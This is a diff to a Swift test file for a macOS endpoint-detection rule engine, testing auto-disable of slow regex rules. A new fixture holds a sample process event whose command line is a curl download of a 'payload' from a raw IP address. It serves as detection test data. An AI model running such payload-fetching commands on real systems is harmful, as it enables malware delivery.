@@ -30,27 +30,49 @@ struct RuleEngineBudgetTests {
         #expect(await e.shouldAutoDisable(elapsedNs: 2_000_000_000, breaches: 1) == true)   // one catastrophic eval
         #expect(await e.shouldAutoDisable(elapsedNs: 1_000, breaches: 5) == true)            // persistent over-budget
         #expect(await e.shouldAutoDisable(elapsedNs: 1_000, breaches: 4) == false)           // below both
+        // Without a regex, a slow wall-clock eval is a host stall, not the rule.
+        #expect(await e.shouldAutoDisable(elapsedNs: 2_000_000_000, breaches: 9, usesRegex: false) == false)
     }
 
-    @Test("a rule that repeatedly blows the eval budget is auto-disabled and stops firing")
+    private func curlEvent() -> Event {
+        let proc = MacCrabCore.ProcessInfo(
+            pid: 4322, ppid: 1, rpid: 1, name: "curl",
+            executable: "/usr/bin/curl",
+            commandLine: "curl -s http://203.0.113.7/payload",
+            args: ["/usr/bin/curl"], workingDirectory: "/tmp",
+            userId: 501, userName: "t", groupId: 20, startTime: Date(),
+            codeSignature: nil,
+            ancestors: [ProcessAncestor(pid: 1, executable: "/bin/bash", name: "bash")],
+            architecture: "arm64", isPlatformBinary: false)
+        return Event(eventCategory: .process, eventType: .start, eventAction: "exec", process: proc)
+    }
+
+    @Test("a regex rule that repeatedly blows the eval budget is auto-disabled and stops firing")
     func autoDisableStopsFiring() async throws {
         try ensureRulesCompiled()
         // Tiny budget: every eval is "over budget"; disable after 3 of them.
         let engine = RuleEngine(slowRuleThresholdNs: 1, autoDisableMaxBreaches: 3)
         _ = try await engine.loadRules(from: compiledRulesDirectory)
         let before = await engine.ruleCount
-        let nvram = "d1a2b3c4-0342-4000-a000-000000000342"
+        let rawIP = "d1a2b3c4-0043-4000-a000-000000000043"   // CommandLine|re
+        let nvram = "d1a2b3c4-0342-4000-a000-000000000342"   // substring only
 
         // First eval: the rule is still enabled and fires.
-        #expect(await engine.evaluate(nvramEvent()).contains { $0.ruleId == nvram })
+        #expect(await engine.evaluate(curlEvent()).contains { $0.ruleId == rawIP })
 
-        // Drive it past the breach threshold.
-        for _ in 0..<3 { _ = await engine.evaluate(nvramEvent()) }
+        // Drive both past the breach threshold.
+        for _ in 0..<3 {
+            _ = await engine.evaluate(curlEvent())
+            _ = await engine.evaluate(nvramEvent())
+        }
 
-        #expect(await engine.autoDisabledRules.contains(nvram),
+        #expect(await engine.autoDisabledRules.contains(rawIP),
                 "the rule should be auto-disabled after repeated over-budget evals")
-        #expect(!(await engine.evaluate(nvramEvent()).contains { $0.ruleId == nvram }),
+        #expect(!(await engine.evaluate(curlEvent()).contains { $0.ruleId == rawIP }),
                 "an auto-disabled rule must no longer fire (stops stalling ingest)")
+        #expect(!(await engine.autoDisabledRules.contains(nvram)),
+                "a rule without a regex is never auto-disabled by wall-clock cost")
+        #expect(await engine.evaluate(nvramEvent()).contains { $0.ruleId == nvram })
         #expect(await engine.ruleCount == before, "auto-disable must not REMOVE the rule")
     }
 
